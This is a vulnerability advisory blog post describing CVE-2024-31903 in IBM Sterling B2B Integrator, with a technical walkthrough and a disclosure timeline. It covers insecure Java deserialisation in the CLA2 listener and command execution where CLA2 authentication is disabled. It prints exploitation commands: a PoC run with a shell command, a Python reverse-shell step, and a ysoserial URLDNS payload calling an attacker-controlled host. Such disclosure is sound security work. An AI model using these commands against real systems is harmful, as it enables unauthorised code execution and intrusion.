---
layout: post
title: 'IBM Sterling B2B Integrator RCE and Command Injection'
excerpt: "Older versions of the IBM Sterling B2B Integrator solution were affected by an exploitable RCE vulnerability (CVE-2024-31903) and a command injection weakness if authentication was disabled.<br/><br/>"
categories:
  - "cve-advisory"
tags:
  - ibm
  - java
  - sterling
  - rce
last_modified_at: 2026-10-02T13:55:00
post-img: assets/img/integrator-banner.jpg
---
<!-- 
# To B or not 2B

*Breaking the IBM Sterling B2B Integrator with, and without, authentication* -->
<!-- 
**TL;DR:** This article describes [CVE-2024-31903](https://www.cve.org/CVERecord?id=CVE-2024-31903), a remote code execution vulnerability discovered in IBM Sterling B2B Integrator. Additionally, a local privilege escalation exploit is provided for installations not enforcing authentication on the CLA2 subsystem. -->

{% include note.html title="Note:" content="Proof of concept code for the exploitation of the vulnerabilities described here are available on GitHub: [ReversecLabs/ibm-sterling-b2b-integrator-poc](https://github.com/ReversecLabs/ibm-sterling-b2b-integrator-poc). <br/><br/>More details can be found in the [DistricCon talk](https://www.districtcon.org/bios-and-talks-2025/to-b-or-not-to-b) 'To B or not 2B: Breaking the IBM B2B Integrator with, and without authentication':" %}


| **Product** | IBM Sterling B2B Integrator |
| **Severity** |<span style="color:orange">Medium</span> |
| **CVE IDs** |	[CVE-2024-31903](https://www.cve.org/CVERecord?id=CVE-2024-31903) |
| **Type**	| Remote Code Execution, Command Injection, Insecure Deserialisation |


{% include toc.html %}

## Introduction

On a client assessment, security issues were discovered affecting [IBM Sterling B2B Integrator](https://www.ibm.com/products/b2b-integrator), a commercial Java-based enterprise application that allows businesses to manage and automate processes with other businesses. Its functionality includes file transfer, job execution, [EDI](https://en.wikipedia.org/wiki/Electronic_data_interchange) transaction handling, and [BPML](https://en.wikipedia.org/wiki/Business_Process_Modeling_Language) processing.

B2B Integrator included a helper subsystem called Command Line Adapter 2 (CLA2), a client-server application that allowed users accessing B2B Integrator through the web UI to specify "programs" and execute them on the underlying server. The CLA2 subsystem was enabled by default and supported authentication for client-server interactions, which was also enabled by default.

![CLA2](/assets/img/cla2.png)

While assessing an instance where CLA2 authentication was disabled, it was possible to develop a proof-of-concept payload that abused this configuration to execute arbitrary commands. This was achieved by sending a specifically crafted message to the CLA2 listener, encoding the shell command in a custom serialized message. Execution of the supplied command as the B2B Integrator service account effectively resulted in privilege escalation.

Later, an insecure deserialization issue was found in the message-processing routine before the authentication check. This meant that third parties could execute arbitrary Java code in the B2B Integrator service's context, whether authenticated or not.

![Dilemma](/assets/img/dilemma.png)

The issues affected Sterling B2B Integrator versions 6.2.0.0 through 6.2.0.2 and 6.0.0.0 through 6.1.2.5 on Linux, Windows, and AIX. IBM was approached confidentially through its HackerOne vulnerability disclosure program, and [a patch was released on October 4, 2024](https://www.ibm.com/support/pages/node/7172233). Affected customers are advised to upgrade to a fixed version.

## Technical Walkthrough

The CLA2 subsystem consisted of a client component and a server component, packaged as `CLA2Client.jar` and `CLA2Server.jar`, respectively. Confusingly, the client component—not the server component—was responsible for receiving instructions to execute programs and shell commands.

On a host with IBM Sterling B2B Integrator installed, the CLA2 client listened on TCP port 5052 on localhost only. A CLA2 server on the same host could interact with it by exchanging serialized Java objects. Exposure was therefore limited to local attackers who had a foothold on the host and were seeking a way to escalate their privileges.

Both CLA2 JAR files were located under the relative path `$B2BHOME/INSTALL/client/cmdline2/`. The issues were discovered by reverse engineering these archives, which could potentially be readable by local users depending on the configured filesystem permissions.

A crucial CLA2 configuration setting controlled whether authentication was enabled for client-server communications. It could be checked in a base .properties file and in an optional "override" configuration:

```bash
$ cat ${B2BHOME}/INSTALL/properties/CmdLine2server.properties
...
## PROPERTY_START
## PROPERTY_NAME: enableAuthentication
## PROPERTY_TYPE: boolean
## PROPERTY_DESCRIPTION
## Authentication should be enabled or not
enableAuthentication=true

# OR (takes precedence if defined)
$ cat ${B2BHOME}/INSTALL/properties/customer_overrides.properties
...
cla2server.enableAuthentication=true
```

Enabling this setting resulted in symmetric encryption of the Java message body, which included the commands to be executed on the system.

### Local Privilege Escalation Scenario

In a B2B Integrator installation with CLA2 authentication disabled, the message body was not encrypted. A valid message could therefore be constructed from scratch by an actor who knew the class definitions. After analysing decompilations of the respective `CmdLine2Result` and `CmdLine2Parms` classes, a proof-of-concept `Main.java` program was authored that instantiated such an object with an attacker-supplied command and sent it to the listening CLA2 service. The PoC also implemented IBM's proprietary binary protocol for remote component communication.

The source code developed, along with helper utilities for exploitation, is available in the accompanying [GitHub repository](https://github.com/ReversecLabs/ibm-b2b-integrator-deserialisation-rce). The attack required the following steps:

1. **Preparation** — After decompiling the CLA2 client and server JARs, copy `CmdLine2Result.java` and `CmdLine2Parms.java` unchanged into a directory alongside `Main.java`. Reproduce the original Java package structure:

   ```text
   src/com/sterlingcommerce/woodstock/services/cmdline2/
   ```

2. **Compilation** — This could be performed on the attacker's system, but shell access to the CLA2 host allowed use of the JDK shipped with B2B Integrator. Compiling with that `javac` improved reliability by ensuring feature parity that could affect deserialization. After transferring the PoC source files to the target, compile them as follows:

   ```bash
   ${B2BHOME}/INSTALL/jdk/bin/javac \
     src/com/sterlingcommerce/woodstock/services/cmdline2/*.java
   ```

3. **Execution** — Invoke the resulting Java program with the CLA2 system's Java runtime and pass an arbitrary Unix shell command as an argument. The following example uses `id` as a proof of concept and redirects its output to a local file:

   ```console
   $ ${B2BHOME}/INSTALL/jdk/bin/java -classpath src/ \
       com.sterlingcommerce.woodstock.services.cmdline2.Main \
       '/bin/sh -c "id > /tmp/withsecureresult"' SEND
   [+] Creating object...
   [+] Sending object...
   [+] ...Sent!
   [+] Receiving header...
   [+] ...header received:
   RESULT
   [+] Receiving result...
   [+] Result received:
   ##[DEBUG]## CmdLine2Result:
   fileSize=0
   outputNameLong=null
   outputNameShort=null
   ******* end of CmdLine2Result *******
   ```

   As the method used by the PoC did not return command output, successful exploitation could be confirmed by observing the newly created file.

4. **Optional: fully interactive shell** — This ad-hoc command-execution primitive could be converted into a fully interactive shell, allowing enumeration of the system with the elevated permissions. The example below used two simple Python scripts, `revshell.py` and `revshell_listener.py`, which could be authored on or uploaded to the host. The former initiated a reverse shell over an arbitrary local port, which the latter received.

   ```console
   $ ${B2BHOME}/INSTALL/jdk/bin/java -classpath src/ \
       com.sterlingcommerce.woodstock.services.cmdline2.Main \
       'python3 /tmp/revshell.py' SEND
   ```

Invoking the PoC while the listener was running resulted in an interactive shell in the context of the B2B Integrator service user:

![Interactive shell obtained through the CLA2 command-execution PoC](/assets/img/ibm-b2b-cla2-interactive-shell.png)

The Sterling B2B Integrator service user could be a domain user if the solution was integrated with [LDAP authentication](https://www.ibm.com/docs/en/b2b-integrator/6.1.0?topic=la-lightweight-directory-access-protocol-ldap-as-authentication-tool-sterling-b2b-integrator). In that scenario, successful exploitation would allow execution not only in an elevated local context but also in an Active Directory context.

### Unauthenticated Remote Code Execution

During analysis of the CLA2 client-side component, `CLA2Client.jar`, the following code was found in the `CmdLine2Thread` class. It was called early in the sequence of events after a message was received from the server:

```java
private boolean setup() throws IOException, ClassNotFoundException {
    if (this.debug) {
        // Printing of socket source using log() calls...
    }
    this.s.setKeepAlive(true);
    this.s.setSoTimeout(CmdLine2Parms.DEF_SO_TIMEOUT);
    if (this.debug) {
        // Printing of socket properties using log() calls...
    }
    BufferedInputStream bis = new BufferedInputStream(this.s.getInputStream());
    this.ois = new ObjectInputStream(bis);
    try {
        Object obj = this.ois.readObject();
        this.clp = (CmdLine2Parms) obj;
        if (this.debug) {
            log("CmdLine2Thread.setup: " + this.clp);
        }
        if (CmdLine2RemoteImpl.isEnable_authentication() &
                (this.clp.signature == null)) {
            // Further processing depending on authentication setting...
        }
```

As shown above, no sanitization of the received object was performed before it was passed to `new ObjectInputStream()`. More importantly, object processing occurred before the authentication check in `isEnable_authentication()`, making the issue exploitable regardless of the CLA2 authentication setting configured by the user.

The attack was demonstrated by crafting and sending a Java gadget chain with the [`ysoserial`](https://github.com/frohoff/ysoserial) deserialization framework. The payload could be encoded for transmission using a rudimentary binary client such as `bin_client.py`, also provided in the [PoC GitHub repository](https://github.com/ReversecLabs/ibm-b2b-integrator-deserialisation-rce). In the example below,  the URLDNS payload was selected to trigger a DNS request to an attacker-controlled name server as proof of exploitation:

```console
# Generate payload
attacker$ java --illegal-access=permit -jar ysoserial-all.jar \
  URLDNS "https://75af9ulzt2ewnyxuxjdzu44tbkhb52tr.burp.17.rs" > urldns.bin

# Transfer to CLA2 host
attacker$ scp urldns.bin user@CLA2host:~/
attacker$ scp bin_client.py user@CLA2host:~/
attacker$ ssh user@CLA2host

[user@CLA2host]$ python3 bin_client.py 127.0.0.1 5052 urldns.bin
b'\xac\xed\x00\x05t\x00\x06RESULTsr\x00?com.sterlingcommerce.woodstock.services.cmdline2.CmdLine2Result...'
```

The returned output suggested that the service had processed the message and responded with more binary data, which the attacker could deserialize to parse the result. At the same time, the DNS request was logged by the Burp Collaborator instance:

![DNS callback caused by the URLDNS deserialization payload](/assets/img/ibm-b2b-urldns-callback.png)

This demonstrated that the CLA2 listener deserialized arbitrary Java objects provided by an untrusted sender over the network. The absence of object-safety checks or protections at the Java runtime level resulted in arbitrary code execution in the service's context.

The success of a deserialization attack depends on factors outside the attacker's control, including the target Java runtime version and the loaded libraries. Limited analysis revealed that the Java runtime shipped with B2B Integrator did not employ defenses against insecure deserialization. However, the set of loaded classes and libraries was significantly small, limiting the known gadgets available.

## Disclosure Timeline

| Date | Party | Summary |
| --- | --- | --- |
| 21/04/2024 | WithSecure | Issues disclosed through IBM HackerOne as two separate reports. |
| 26/04/2024 | IBM | Report describing the privilege escalation issue closed as “Informative.” |
| 28/05/2024 | WithSecure | IBM contacted for an update on the unauthenticated RCE issue; the response provided no further information. |
| 26/08/2024 | WithSecure | IBM contacted again for an update on the unauthenticated RCE issue; the response provided no further information. |
| 04/10/2024 | IBM | [Fix released](https://www.ibm.com/support/pages/node/7172233) for the unauthenticated RCE issue, followed by discussion about attribution. |
